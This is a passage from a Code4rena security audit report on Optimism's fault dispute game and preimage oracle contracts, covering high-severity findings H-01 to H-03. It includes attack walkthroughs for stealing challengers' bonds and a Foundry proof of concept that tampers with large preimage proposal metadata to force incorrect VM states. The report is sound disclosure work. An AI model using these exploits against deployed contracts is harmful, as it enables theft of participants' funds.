---
sponsor: "Optimism"
slug: "2024-07-optimism"
date: "2024-08-16"
title: "Optimism Superchain"
findings: "https://github.com/code-423n4/2024-07-optimism-findings/issues"
contest: 400
---

# Overview

## About C4

Code4rena (C4) is an open organization consisting of security researchers, auditors, developers, and individuals with domain expertise in smart contracts.

A C4 audit is an event in which community participants, referred to as Wardens, review, audit, or analyze smart contract logic in exchange for a bounty provided by sponsoring projects.

During the audit outlined in this document, C4 conducted an analysis of the Optimism Superchain smart contract system written in Solidity. The audit took place between July 15 — July 29, 2024.

## Wardens

34 Wardens contributed reports to Optimism Superchain:

  1. [xuwinnie](https://code4rena.com/@xuwinnie)
  2. [RadiantLabs](https://code4rena.com/@RadiantLabs) ([3docSec](https://code4rena.com/@3docSec), [haxatron](https://code4rena.com/@haxatron) and [EV\_om](https://code4rena.com/@EV_om))
  3. [Zubat](https://code4rena.com/@Zubat) ([pwning](https://code4rena.com/@pwning) and [rileyholterhus](https://code4rena.com/@rileyholterhus))
  4. [alexfilippov314](https://code4rena.com/@alexfilippov314)
  5. [Topmark](https://code4rena.com/@Topmark)
  6. [K42](https://code4rena.com/@K42)
  7. [Femboys](https://code4rena.com/@Femboys) ([samczsun](https://code4rena.com/@samczsun) and [cts](https://code4rena.com/@cts))
  8. [0x1771](https://code4rena.com/@0x1771)
  9. [kuprum](https://code4rena.com/@kuprum)
  10. [n4nika](https://code4rena.com/@n4nika)
  11. [zraxx](https://code4rena.com/@zraxx)
  12. [bronze\_pickaxe](https://code4rena.com/@bronze_pickaxe)
  13. [KupiaSec](https://code4rena.com/@KupiaSec)
  14. [oakcobalt](https://code4rena.com/@oakcobalt)
  15. [ether\_sky](https://code4rena.com/@ether_sky)
  16. [OMEN](https://code4rena.com/@OMEN)
  17. [twcctop](https://code4rena.com/@twcctop)
  18. [Bauchibred](https://code4rena.com/@Bauchibred)
  19. [Naresh](https://code4rena.com/@Naresh)
  20. [sivanesh\_808](https://code4rena.com/@sivanesh_808)
  21. [Al-Qa-qa](https://code4rena.com/@Al-Qa-qa)
  22. [SeveritySquad](https://code4rena.com/@SeveritySquad) ([shealtielanz](https://code4rena.com/@shealtielanz) and [0x74554](https://code4rena.com/@0x74554))
  23. [Dup1337](https://code4rena.com/@Dup1337) ([sorrynotsorry](https://code4rena.com/@sorrynotsorry) and [deliriusz](https://code4rena.com/@deliriusz))
  24. [Sparrow](https://code4rena.com/@Sparrow)
  25. [Prestige](https://code4rena.com/@Prestige)
  26. [Walter](https://code4rena.com/@Walter)
  27. [arabgodx](https://code4rena.com/@arabgodx)
  28. [hihen](https://code4rena.com/@hihen)

This audit was judged by [obront](https://code4rena.com/@obront).

Final report assembled by [thebrittfactor](https://twitter.com/brittfactorC4).

# Summary

The C4 analysis yielded an aggregated total of 16 unique vulnerabilities. Of these vulnerabilities, 5 received a risk rating in the category of HIGH severity and 11 received a risk rating in the category of MEDIUM severity.

Additionally, C4 analysis included 21 reports detailing issues with a risk rating of LOW severity or non-critical.

All of the issues presented here are linked back to their original finding.

# Scope

The code under review can be found within the [C4 Optimism Superchain repository](https://github.com/code-423n4/2024-07-optimism), and is composed of 6 smart contracts written in the Solidity programming language and includes 1847 lines of Solidity code.

# Severity Criteria

C4 assesses the severity of disclosed vulnerabilities based on three primary risk categories: high, medium, and low/non-critical.

High-level considerations for vulnerabilities span the following key areas when conducting assessments:

- Malicious Input Handling
- Escalation of privileges
- Arithmetic
- Gas use

For more information regarding the severity criteria referenced throughout the submission review process, please refer to the documentation provided on [the C4 website](https://code4rena.com), specifically our section on [Severity Categorization](https://docs.code4rena.com/awarding/judging-criteria/severity-categorization).

# High Risk Findings (5)
## [[H-01] Invalid `DISPUTED_L2_BLOCK_NUMBER` is passed to VM](https://github.com/code-423n4/2024-07-optimism-findings/issues/36)
*Submitted by [xuwinnie](https://github.com/code-423n4/2024-07-optimism-findings/issues/36)*

The span of the game tree at split depth is far larger than the length between the starting block and the claimed block. When `starting block + trace index + 1 > claimed block`, honest party should continue to commit to the root of the claimed block. However, the `DISPUTED_L2_BLOCK_NUMBER` passed to the VM is always `starting block + trace index + 1`, which means the op-program (at inter-block perspective) will not stop until it reaches the l2 safe head (corresponding to parenthash), and if the claimed block is earlier than the safe head, it can be challenged and will be considered invalid.

### Proof of Concept

Since op-program is out of scope of this audit, this report will not spend too much time in proving *block earlier than safe head can be challenged*, instead it will only show the inconsistency within the smart contract part.

For simplicity, we assume the span of the game tree at split depth is 8 and starting block is 0. At block level, we use **defend a ->p b** to refer to commit a valid VM trace with a as starting output, b as disputed output, p as disputed block number and `VALID` as the final state, similarly **attack a ->p b** refers to commit a valid VM trace with ... and `INVALID` or `PANIC` as the final state. We use Bi to refer to the valid L2 root at block i.

Suppose Alice made a valid root claim B2 for block 2, Bob made a valid root claim B3 for block 3 and they claim at the same L1 block (so the stored `l1Head` will be the identical). Ideally, both of them should be able to defend their claim. We already know that Bob can **defend B2 ->3 B3** in his own game. What if Bob tries to attack Alice in her game?

(Recall Alice's view of valid state is 12222222 and Bob's is 12333333).

1. Bob attacks by claiming B3 (trace index 3).
2. Alice attacks by claiming B2 (trace index 1).
3. Bob defends by claiming B3 (trace index 2).
4. Alice **attacks B2 ->3 B3** (disputed block = starting block + trace index + 1 = 3).

```

        /// @inheritdoc IFaultDisputeGame
        function addLocalData(uint256 _ident, uint256 _execLeafIdx, uint256 _partOffset) external {
            // INVARIANT: Local data can only be added if the game is currently in progress.
            if (status != GameStatus.IN_PROGRESS) revert GameNotInProgress();

            (Claim starting, Position startingPos, Claim disputed, Position disputedPos) =
                _findStartingAndDisputedOutputs(_execLeafIdx);
            Hash uuid = _computeLocalContext(starting, startingPos, disputed, disputedPos);

            IPreimageOracle oracle = VM.oracle();
            if (_ident == LocalPreimageKey.L1_HEAD_HASH) {
                // Load the L1 head hash
                oracle.loadLocalData(_ident, uuid.raw(), l1Head().raw(), 32, _partOffset);
            } else if (_ident == LocalPreimageKey.STARTING_OUTPUT_ROOT) {
                // Load the starting proposal's output root.
                oracle.loadLocalData(_ident, uuid.raw(), starting.raw(), 32, _partOffset);
            } else if (_ident == LocalPreimageKey.DISPUTED_OUTPUT_ROOT) {
                // Load the disputed proposal's output root
                oracle.loadLocalData(_ident, uuid.raw(), disputed.raw(), 32, _partOffset);
            } else if (_ident == LocalPreimageKey.DISPUTED_L2_BLOCK_NUMBER) {
                // Load the disputed proposal's L2 block number as a big-endian uint64 in the
                // high order 8 bytes of the word.

                // We add the index at depth + 1 to the starting block number to get the disputed L2
                // block number.
                uint256 l2Number = startingOutputRoot.l2BlockNumber + disputedPos.traceIndex(SPLIT_DEPTH) + 1;

                oracle.loadLocalData(_ident, uuid.raw(), bytes32(l2Number << 0xC0), 8, _partOffset);
            } else if (_ident == LocalPreimageKey.CHAIN_ID) {
                // Load the chain ID as a big-endian uint64 in the high order 8 bytes of the word.
                oracle.loadLocalData(_ident, uuid.raw(), bytes32(L2_CHAIN_ID << 0xC0), 8, _partOffset);
            } else {
                revert InvalidLocalIdent();
            }
        }
```

However, all VM inputs above are identical for **B2 ->3 B3** in these two cases. Since VM step is deterministic, **B2 ->3 B3** cannot be defended in one game while attacked in another, which shows the contradiction. The problem is that claimed block number is not passed to the VM, so the VM cannot differentiate the context between the two games.

### Recommended Mitigation Steps

```
    uint256 l2Number = min(startingOutputRoot.l2BlockNumber + disputedPos.traceIndex(SPLIT_DEPTH) + 1, l2BlockNumber());
```

### Note

```
    func (d *Driver) ValidateClaim(l2ClaimBlockNum uint64, claimedOutputRoot eth.Bytes32) error {
    	l2Head := d.SafeHead()
    	outputRoot, err := d.l2OutputRoot(min(l2ClaimBlockNum, l2Head.Number))
    	if err != nil {
    		return fmt.Errorf("calculate L2 output root: %w", err)
    	}
    	d.logger.Info("Validating claim", "head", l2Head, "output", outputRoot, "claim", claimedOutputRoot)
    	if claimedOutputRoot != outputRoot {
    		return fmt.Errorf("%w: claim: %v actual: %v", ErrClaimNotValid, claimedOutputRoot, outputRoot)
    	}
    	return nil
    }
```

Here `l2ClaimBlockNum` is just `DISPUTED_L2_BLOCK_NUMBER`, so `DISPUTED_L2_BLOCK_NUMBER` clearly should be capped at claimed l2 block number; otherwise, the inter-block op-program execution will never stop until it reaches safe head, which means all claims earlier than safe head is invalid in op-program's perspective.

### Assessed type

Context

**[ajsutton (Optimism) confirmed and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/36#issuecomment-2259747357):**
 > This is valid and an excellent analysis. I've seen a number of claims that the `DISPUTED_L2_BLOCK_NUMBER` needs to be capped but before this all of them have provided an example where trace extension still results in the correct game resolution. This is the only case I've seen that identifies the actual case that I believe will give the wrong result. It does require a few more details to make the attack actually work though.
> 
> Specifically, if the correct output root is proposed for block 13, the attacker could counter using a trace that includes valid blocks up to block 14. The value the attacker uses for block 14 must be the honest value and block 14 must be safe at the game's L1 head. In the honest actor's trace, the output for block 13 is extended to the end of the game so the only difference is the attacker includes one extra block in the trace they use. At the split depth both actors would agree on block 13 and disagree on block 14 and then execute cannon/op-program to decide if the transition from block 13 to 14 is valid or not. Since block 14 is a valid safe block, op-program will be able to continue the derivation past block 13 and resolve that the claimed block 14 is valid even though it's past the proposed output root.
> 
> In addition, you have to manipulate the game so that either the dishonest actor posts the first claim in the bottom half or that the honest actor is required to post the first claim of the bottom half such that the post state is an honest claim. Otherwise the restrictions on the required status code for the root of the bottom game and not being able to defend the root of the bottom claim prevent the attack.

***

## [[H-02] The LPP challenge period can cause malicious and freeloader claims to be uncounterable and can also cause freeloader claims to be abused to entrap honest challengers](https://github.com/code-423n4/2024-07-optimism-findings/issues/29)
*Submitted by [RadiantLabs](https://github.com/code-423n4/2024-07-optimism-findings/issues/29), also found by [Zubat](https://github.com/code-423n4/2024-07-optimism-findings/issues/51) and [alexfilippov314](https://github.com/code-423n4/2024-07-optimism-findings/issues/26)*

In some cases, the honest challenger must pass an LPP in order to counter a `MAX_GAME_DEPTH` claim through `step()`. For instance, "in the event that the preimage is too large to be submitted through calldata in a single block, challengers must resort to the streaming option" as described in the Optimism [specs](https://specs.optimism.io/fault-proof/stage-one/fault-dispute-game.html?highlight=large%20preimage%20proposal#preimageoracle-interaction).

However, an issue arises because to pass an LPP, the honest challenger must wait for `CHALLENGE_PERIOD` seconds in order to pass the LPP to be able to `step()` against a malicious `MAX_GAME_DEPTH` claim. The honest challenger will have a minimum of one `CLOCK_EXTENSION` (3 hours on mainnet) period on their chess clock, which cannot cover the `CHALLENGE_PERIOD` for an LPP (1 day on mainnet).

There are essentially 3 impacts that this can cause:

**Impact 1: A malicious `MAX_GAME_DEPTH` claim can be uncounterable if honest challenger does not have time left.**

If the honest challenger has less than 1 day left in their chess clock when reaching the malicious claim at `MAX_GAME_DEPTH`, they cannot possibly pass an LPP in time. This will cause the malicious claim to be uncountered while the honest challenger's claim will be countered leading to an incorrect game result.

**Impact 2: Uncounterable freeloader claims can be made by forcing an honest challenger to inherit a clock smaller than `CHALLENGE_PERIOD`.**

The `CLOCK_EXTENSION` is a feature meant for honest challengers to counter a freeloader claim, a freeloader claim is described as follows:

Consider an attacker claim denoted by A in the subtree below. Suppose that this claim is valid, then the correct move for the honest party is to defend the claim. The honest party's claim is denoted by claim H.

       A  
     /   \
    F     H

To prevent themselves from losing the bond, suppose the attacker then attacks claim A with the claim F. Due to the leftmost priority, they would receive the bond if their freeloader claim F remains uncountered. This is possible if the attacker's chess clock has very little time left because the honest party needs to use the attacker's chess clock to counter the freeloader claim.

To resolve this, Optimism uses clock extensions, where if a chess clock has less than `CLOCK_EXTENSION` seconds left, it is extended to `CLOCK_EXTENSION` seconds.

If the honest challenger must pass an LPP to counter the freeloader claim at `MAX_GAME_DEPTH` via `step()` it will not have enough time to do so, resulting in the freeloader claim stealing the bond from the honest party's claim.

**Impact 3: Freeloader claims can now be used to bait honest challengers to respond and then entrap them, winning all the bonds they used to counter the freeloader claim.**

Combining the points raised in both impacts earlier, we can now see how freeloader claims can be used as bait to steal all the bonds used to counter the freeloader claim. The key point here is that when the honest challenger counters a freeloader claim, they essentially "swap" chess clocks with the attacker. All further moves made by the honest challenger now use the attacker's chess clock which can be manipulated to `CLOCK_EXTENSION` earlier. Now, let's take a look at the following scenario:

       A  
     /   \
    F1    H1
    |
    H2
    |
    F2

Here, the attacker has responded to the honest user's claim H2, with their new claim F2. To counter F2, the honest challenger will still be using the attacker's chess clock which will be manipulated to `CLOCK_EXTENSION` time. Let's suppose F2 is a claim at `MAX_GAME_DEPTH` and to counter it the honest challenger must pass an LPP, as elaborated earlier they won't be able to do so and they essentially cannot counter F2. But now, they also will have their bonds for posting H2 stolen from them, as F2 will now counter H2. Furthermore, the freeloader claim F1 will still steal the bond from A using the leftmost priority.

Therefore, this technique can be used attackers to entrap honest challengers, by purposefully posting an invalid state that has a valid state preceding it that requires a max size LPP to execute `step()` on, they can further steal bonds away from the honest challengers to counter the freeloader claim.

### Recommended Mitigation Steps

Apply a bigger extension such as `CHALLENGE_PERIOD + CLOCK_EXTENSION` at the `MAX_GAME_DEPTH - 1` claim, as shown below.

```diff
+       IPreimageOracle oracle = VM.oracle();
+       if (nextPositionDepth == MAX_GAME_DEPTH - 1 && nextDuration.raw() > MAX_CLOCK_DURATION.raw() - oracle.challengePeriod() - CLOCK_EXTENSION.raw()) {
+           // Apply 1 CHALLENGE_PERIOD + 1 CLOCK_EXTENSION here. 
+           nextDuration = Duration.wrap(MAX_CLOCK_DURATION.raw() - oracle.challengePeriod() - CLOCK_EXTENSION.raw());
+       }
+       else if (nextDuration.raw() > MAX_CLOCK_DURATION.raw() - CLOCK_EXTENSION.raw()) {
-       if (nextDuration.raw() > MAX_CLOCK_DURATION.raw() - CLOCK_EXTENSION.raw()) {
            // If the potential grandchild is an execution trace bisection root, double the clock extension.
            uint64 extensionPeriod =
                nextPositionDepth == SPLIT_DEPTH - 1 ? CLOCK_EXTENSION.raw() * 2 : CLOCK_EXTENSION.raw();
            nextDuration = Duration.wrap(MAX_CLOCK_DURATION.raw() - extensionPeriod);
        }

```

This will solve all of the scenarios above.

**[ajsutton (Optimism) confirmed and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/29#issuecomment-2261726452):**
 > Impact 1 is invalid - the honest actor should be responding reasonably quickly and is expected to still have sufficient time on the clock to allow for the large preimage proposal time.
> 
> However, the impact of this on freeloader claims and the clock extension being insufficient in the case of large preimages being required is valid and something we will need to fix.

**[obront (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/29#issuecomment-2264406800):**
 > This issue is valid, but given the clarification from the sponsor that Impact 1 is invalid, I believe it's likely that a Medium severity is more appropriate (i.e., worst case does not allow spoofing invalid state, only stealing some bonds).
> 
> I'll also need to consider whether the dups are valid as dups (or should receive partial credit), as this report was the most clear on the other implications.
> 
 > The other reports do identify the freeloader claims, which is the core issue. I will downgrade to Medium and leave the dups as-is receiving full credit.

**[haxatron (warden) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/29#issuecomment-2265589184):**
 > @obront, we believe high is more appropriate for this finding. From impact 3 about entrapping the honest challenger, we note the **loss of funds** of the honest challenger which is very different from the **loss of incentive**. Here, "loss of funds" refers the funds lost by the honest challenger when posting their bonds and getting them stolen by the attacker and "loss of incentive" refers to the bonds entitled by the honest challenger for correctly countering the adversary claim.
> 
> Furthermore, the loss of fund impact is high, if we look at our example in impact 3, the honest challenger will post the bond H2 and lose their bond H2, which as `MAX_GAME_DEPTH - 1` comes down to `270_000_000 * 200 gwei = 54 ETH` which is by no means a small amount. This loss is also cumulative, as the honest challenger will lose all their bonds they posted to counter the freeloader claim all the way down to `MAX_GAME_DEPTH`.
> 
> All in all, the "loss of funds" impact to the honest challenger is high, so we also believe this should be a high.

**[EV_om (warden) commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/29#issuecomment-2265702633):**
 > @obront Issue [#26](https://github.com/code-423n4/2024-07-optimism-findings/issues/26), on the other hand, only points out impact 2 in this finding. The main difference between impacts 2 and 3 is:
> - **Impact 2** only relates to uncounterable freeloader claims at depth `MAX_GAME_DEPTH`. These claims will have the effect of the attacker being able to reclaim their own bond from the parent claim, instead of it being paid out to the honest challenger for countering it. This represents a loss of incentives for honest challengers.
> - **Impact 3** relates to uncounterable freeloader claims at lower depths, and has the effect of all bonds posted by honest challengers from a freeloader claim at any depth all the way down to `MAX_GAME_DEPTH` being paid out to the attacker. This represents a loss of funds for honest challengers.
> 
> Because #26 only points out impact 2 and not the higher impact 3, partial credit would seem fair.

**[obront (judge) increased severity to High and commented](https://github.com/code-423n4/2024-07-optimism-findings/issues/29#issuecomment-2269471068):**
 > After much consideration, I'm in agreement with @haxatron and @EV_om here on all counts.
> 
> 1. For consistency in judging, the other issues deemed High either allowed the VM to act in a way that would allow incorrect output roots to be proven, or would allow valid claims to be challenged in a predictable way to allow intentionally stealing a large amount of bonds. This falls into the latter category, so will be upgraded to High.
> 
> 2. Issue #26 does capture the root cause here, and gets most of the way there, but on its own would be judged as a Medium because it doesn't show how bonds could be stolen. I will be moving to partial credit, but because so much of the exploit was understood, I will award 75%.

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-07-optimism-findings/issues/29).*

***

## [[H-03] LPP metadata can be altered after the challenge period is over, allowing incorrect states to be proven](https://github.com/code-423n4/2024-07-optimism-findings/issues/27)
*Submitted by [RadiantLabs](https://github.com/code-423n4/2024-07-optimism-findings/issues/27), also found by [kuprum](https://github.com/code-423n4/2024-07-optimism-findings/issues/105), [n4nika](https://github.com/code-423n4/2024-07-optimism-findings/issues/100), [alexfilippov314](https://github.com/code-423n4/2024-07-optimism-findings/issues/14), and [Femboys](https://github.com/code-423n4/2024-07-optimism-findings/issues/2)*

<https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L417><br><https://github.com/code-423n4/2024-07-optimism/blob/70556044e5e080930f686c4e5acde420104bb2c4/packages/contracts-bedrock/src/cannon/PreimageOracle.sol#L431>

### Vulnerability details

It was reported [in the Spearbit review (5.2.5 "Preimage proposals can be initialized multiple times")](https://github.com/spearbit/portfolio/blob/35e01e225519242589ab83f6fad100db892bcfe9/pdfs/Spearbit-Coinbase-Security-Review-June-2024.pdf) that it is possible to re-initialize LPPs, at a loss for the caller, because the `initLPP` function doesn't check for the LPP to exist already.

If we look at the `initLPP()` function, however, we can see that there is another vulnerability that can be chained: at L431, the to-be-initialized `LPPMetadata` is unnecessarily read from storage instead of being initialized empty:

```Solidity
File: PreimageOracle.sol
417:     function initLPP(uint256 _uuid, uint32 _partOffset, uint32 _claimedSize) external payable {
418:         // The bond provided must be at least `MIN_BOND_SIZE`.
419:         if (msg.value < MIN_BOND_SIZE) revert InsufficientBond();
420: 
421:         // The caller of `addLeavesLPP` must be an EOA, so that the call inputs are always available in block bodies.
422:         if (msg.sender != tx.origin) revert NotEOA();
423: 
424:         // The part offset must be within the bounds of the claimed size + 8.
425:         if (_partOffset >= _claimedSize + 8) revert PartOffsetOOB();
426: 
427:         // The claimed size must be at least `MIN_LPP_SIZE_BYTES`.
428:         if (_claimedSize < MIN_LPP_SIZE_BYTES) revert InvalidInputSize();
429: 
430:         // Initialize the proposal metadata.
431:         LPPMetaData metaData = proposalMetadata[msg.sender][_uuid];
432:         proposalMetadata[msg.sender][_uuid] = metaData.setPartOffset(_partOffset).setClaimedSize(_claimedSize);
433:         proposals.push(LargePreimageProposalKeys(msg.sender, _uuid));
434: 
435:         // Assign the bond to the proposal.
436:         proposalBonds[msg.sender][_uuid] = msg.value;
437:     }
```

Because of this, L431 and L432 in fact allow to arbitrarily change an existing LPP's `partOffset` and `claimedSize` metadata, while leaving unchanged its other metadata, including its finalization `timestamp` if set.

Additionally, `squeezeLPP()` does not check that `bytesProcessed == claimedSize` since this check is already performed on finalization in `addLeavesLPP()`.

By exploiting these three issues, it is then possible that:

- An LPP is first created and populated using correct data.
- It is finalized, and passes its challenge period.
- After the challenge period is over, its `claimedSize` is changed to an arbitrary length by calling `initLPP` again.
- Immediately after (without an opportunity for a challenge to happen), the LPP data is stored in `preimageParts` with a `squeezeLPP()` call along with an incorrect `claimedSize` stored in `preimageLengths`.
- With the incorrect preimage length, it is possible to trick the MIPS VM to produce an incorrect state by, for example, having the preimage length be less than the part offset + length of data to read which will cause a lesser number of bytes being copied over to memory during a read syscall, thereby producing an incorrect `memRoot` and thus an incorrect state (demonstrated in the coded PoC below).

Similar attacks are also possible by instead (or additionally) altering the `partOffset`,  with the same outcome of producing an incorrect `memRoot` leading to an incorrect state hash.

### Impact

Malicious actors can trick the VM into producing an incorrect state and therefore, allow a dishonest participant to win the fault dispute game, stealing the bonds of honest participants.

### Proof of Concept

The following PoC compares side-by-side the outcome of two courses of action: one that is honest, and one that exploits the above-mentioned vulnerabilities to tamper with the preimage lengths. At the end, the test proves that the two courses of action yield a different state of the MIPS VM.

<details>
  <summary>Coded PoC in Foundry</summary>

```Solidity
    // Add this test to the PreimageOracle_LargePreimageProposals_Test test contract in PreimageOracle.t.sol
    // and import { MIPS } from "src/cannon/MIPS.sol";
    function testAlterLppAfterChallengePeriod() public {
        // We create another oracle to compare outcomes
        PreimageOracle honestOracle = oracle;
        PreimageOracle hackedOracle = new PreimageOracle({ _minProposalSize: MIN_SIZE_BYTES, _challengePeriod: CHALLENGE_PERIOD });
        vm.label(address(hackedOracle), "HackedPreimageOracle");

        // Normal lifecycle of an LPP...
        bytes memory data = new bytes(136);
        for (uint256 i; i < data.length; i++) {
            data[i] = bytes1(uint8(i));
        }

        honestOracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 132, uint32(data.length));
        hackedOracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 132, uint32(data.length));

        LibKeccak.StateMatrix memory stateMatrix;
        bytes32[] memory stateCommitments = _generateStateCommitments(stateMatrix, data);
        honestOracle.addLeavesLPP(TEST_UUID, 0, data, stateCommitments, true);
        hackedOracle.addLeavesLPP(TEST_UUID, 0, data, stateCommitments, true);

        LibKeccak.StateMatrix memory matrix;
        PreimageOracle.Leaf[] memory leaves = _generateLeaves(matrix, data);

        bytes32[] memory preProof = new bytes32[](16);
        preProof[0] = _hashLeaf(leaves[1]);
        bytes32[] memory postProof = new bytes32[](16);
        postProof[0] = _hashLeaf(leaves[0]);
        for (uint256 i = 1; i < preProof.length; i++) {
            bytes32 zeroHash = oracle.zeroHashes(i);
            preProof[i] = zeroHash;
            postProof[i] = zeroHash;
        }

        // The proposal is honest on both oracles up to here, so it can only go unchallenged
        vm.warp(block.timestamp + oracle.challengePeriod() + 1 seconds);

        // ... up to here.

        // ☢️ challenge period is over, now we can alter the part to have an arbitrary length
        // and promote it immediately
        hackedOracle.initLPP{ value: oracle.MIN_BOND_SIZE() }(TEST_UUID, 132, 125);

        // Finalize the proposal.
        honestOracle.squeezeLPP({
            _claimant: address(this),
            _uuid: TEST_UUID,
            _stateMatrix: _stateMatrixAtBlockIndex(data, 1),
            _preState: leaves[0],
            _preStateProof: preProof,
            _postState: leaves[1],
            _postStateProof: postProof
        });
        hackedOracle.squeezeLPP({
            _claimant: address(this),
            _uuid: TEST_UUID,
            _stateMatrix: _stateMatrixAtBlockIndex(data, 1),
            _preState: leaves[0],
            _preStateProof: preProof,
            _postState: leaves[1],
            _postStateProof: postProof
        });

        bytes32 finalDigest = _setStatusByte(keccak256(data), 2);

        // The key of the data is the same:
        assertTrue(honestOracle.preimagePartOk(finalDigest, 132));
        assertTrue(hackedOracle.preimagePartOk(finalDigest, 132));

        // 🚨 However, the part has been altered in its length...
        assertEq(honestOracle.preimageLengths(finalDigest), 136);
        assertEq(hackedOracle.preimageLengths(finalDigest), 125);

        (, uint256 datLen) = honestOracle.readPreimage(finalDigest, 132);
        (, uint256 hDatLen) = hackedOracle.readPreimage(finalDigest, 132);
        
        assertNotEq(datLen, hDatLen);

        // And the MIPS state machine behavior is 
        // consequently altered when reading at this key
        // (this setup is inspired by "test_preimage_read_succeeds")
        MIPS honestMips = new MIPS(honestOracle);
        MIPS hackedMips = new MIPS(hackedOracle);

        uint32 pc = 0x0;
        uint32 insn = 0x0000000c; // syscall
        uint32 a1 = 0x4;
        uint32 a1_val = 0x0000abba;
        bytes32 memRoot = 0xcdeeb321c3368b44bb49df936a17fc933160e1581a00a3058e1d5e034ca57443;
        bytes memory proof = hex"0000000c0000abba0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5b4c11951957c6f8f642c4af61cd6b24640fec6dc7fc607ee8206a99e92410d3021ddb9a356815c3fac1026b6dec5df3124afbadb485c9ba5a3e3398a04b7ba85e58769b32a1beaf1ea27375a44095a0d1fb664ce2dd358e7fcbfb78c26a193440eb01ebfc9ed27500cd4dfc979272d1f0913cc9f66540d7e8005811109e1cf2d887c22bd8750d34016ac3c66b5ff102dacdd73f6b014e710b51e8022af9a1968ffd70157e48063fc33c97a050f7f640233bf646cc98d9524c6b92bcf3ab56f839867cc5f7f196b93bae1e27e6320742445d290f2263827498b54fec539f756afcefad4e508c098b9a7e1d8feb19955fb02ba9675585078710969d3440f5054e0f9dc3e7fe016e050eff260334f18a5d4fe391d82092319f5964f2e2eb7c1c3a5f8b13a49e282f609c317a833fb8d976d11517c571d1221a265d25af778ecf8923490c6ceeb450aecdc82e28293031d10c7d73bf85e57bf041a97360aa2c5d99cc1df82d9c4b87413eae2ef048f94b4d3554cea73d92b0f7af96e0271c691e2bb5c67add7c6caf302256adedf7ab114da0acfe870d449a3a489f781d659e8beccda7bce9f4e8618b6bd2f4132ce798cdc7a60e7e1460a7299e3c6342a579626d22733e50f526ec2fa19a22b31e8ed50f23cd1fdf94c9154ed3a7609a2f1ff981fe1d3b5c807b281e4683cc6d6315cf95b9ade8641defcb32372f1c126e398ef7a5a2dce0a8a7f68bb74560f8f71837c2c2ebbcbf7fffb42ae1896f13f7c7479a0b46a28b6f55540f89444f63de0378e3d121be09e06cc9ded1c20e65876d36aa0c65e9645644786b620e2dd2ad648ddfcbf4a7e5b1a3a4ecfe7f64667a3f0b7e2f4418588ed35a2458cffeb39b93d26f18d2ab13bdce6aee58e7b99359ec2dfd95a9c16dc00d6ef18b7933a6f8dc65ccb55667138776f7dea101070dc8796e3774df84f40ae0c8229d0d6069e5c8f39a7c299677a09d367fc7b05e3bc380ee652cdc72595f74c7b1043d0e1ffbab734648c838dfb0527d971b602bc216c9619ef0abf5ac974a1ed57f4050aa510dd9c74f508277b39d7973bb2dfccc5eeb0618db8cd74046ff337f0a7bf2c8e03e10f642c1886798d71806ab1e888d9e5ee87d00000000c0000abba0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ad3228b676f7d3cd4284a5443f17f1962b36e491b30a40b2405849e597ba5fb5b4c11951957c6f8f642c4af61cd6b24640fec6dc7fc607ee8206a99e92410d3021ddb9a356815c3fac1026b6dec5df3124afbadb485c9ba5a3e3398a04b7ba85e58769b32a1beaf1ea27375a44095a0d1fb664ce2dd358e7fcbfb78c26a193440eb01ebfc9ed27500cd4dfc979272d1f0913cc9f66540d7e8005811109e1cf2d887c22bd8750d34016ac3c66b5ff102dacdd73f6b014e710b51e8022af9a1968ffd70157e48063fc33c97a050f7f640233bf646cc98d9524c6b92bcf3ab56f839867cc5f7f196b93bae1e27e6320742445d290f2263827498b54fec539f756afcefad4e508c098b9a7e1d8feb19955fb02ba9675585078710969d3440f5054e0f9dc3e7fe016e050eff260334f18a5d4fe391d82092319f5964f2e2eb7c1c3a5f8b13a49e282f609c317a833fb8d976d11517c571d1221a265d25af778ecf8923490c6ceeb450aecdc82e28293031d10c7d73bf85e57bf041a97360aa2c5d99cc1df82d9c4b87413eae2ef048f94b4d3554cea73d92b0f7af96e0271c691e2bb5c67add7c6caf302256adedf7ab114da0acfe870d449a3a489f781d659e8beccda7bce9f4e8618b6bd2f4132ce798cdc7a60e7e1460a7299e3c6342a579626d22733e50f526ec2fa19a22b31e8ed50f23cd1fdf94c9154ed3a7609a2f1ff981fe1d3b5c807b281e4683cc6d6315cf95b9ade8641defcb32372f1c126e398ef7a5a2dce0a8a7f68bb74560f8f71837c2c2ebbcbf7fffb42ae1896f13f7c7479a0b46a28b6f55540f89444f63de0378e3d121be09e06cc9ded1c20e65876d36aa0c65e9645644786b620e2dd2ad648ddfcbf4a7e5b1a3a4ecfe7f64667a3f0b7e2f4418588ed35a2458cffeb39b93d26f18d2ab13bdce6aee58e7b99359ec2dfd95a9c16dc00d6ef18b7933a6f8dc65ccb55667138776f7dea101070dc8796e3774df84f40ae0c8229d0d6069e5c8f39a7c299677a09d367fc7b05e3bc380ee652cdc72595f74c7b1043d0e1ffbab734648c838dfb0527d971b602bc216c9619ef0abf5ac974a1ed57f4050aa510dd9c74f508277b39d7973bb2dfccc5eeb0618db8cd74046ff337f0a7bf2c8e03e10f642c1886798d71806ab1e888d9e5ee87d0";

        uint32[32] memory registers;
        registers[2] = 4003; // read syscall
        registers[4] = 5; // fd
        registers[5] = a1; // addr
        registers[6] = 4; // count

        MIPS.State memory state = MIPS.State({
            memRoot: memRoot,
            preimageKey: finalDigest,
            preimageOffset: 132, // start reading past the pre-image length prefix
            pc: pc,
            nextPC: pc + 4,
            lo: 0,
            hi: 0,
            heap: 0,
            exitCode: 0,
            exited: false,
            step: 1,
            registers: registers
        });
        
        bytes memory encodedRegisters;
        for (uint256 i = 0; i < state.registers.length; i++) {
            encodedRegisters = bytes.concat(encodedRegisters, abi.encodePacked(state.registers[i]));
        }

        bytes memory encodedState = abi.encodePacked(
            state.memRoot,
            state.preimageKey,
            state.preimageOffset,
